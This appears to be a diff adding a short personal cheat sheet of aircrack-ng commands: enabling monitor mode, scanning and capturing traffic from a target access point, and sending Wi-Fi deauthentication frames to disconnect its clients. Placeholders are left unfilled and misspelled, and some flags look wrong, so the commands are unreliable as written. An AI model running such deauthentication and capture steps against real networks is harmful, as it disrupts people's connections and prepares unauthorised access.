@@ -1,0 +1,4 @@
+airmon-ng start wlan0mon
+airodump-ng wlan0mon
+sudo airodump-ng -c channel -b mac adrress wlan0
+aireplay-ng --deauth x -a mac adrress wlan0mon
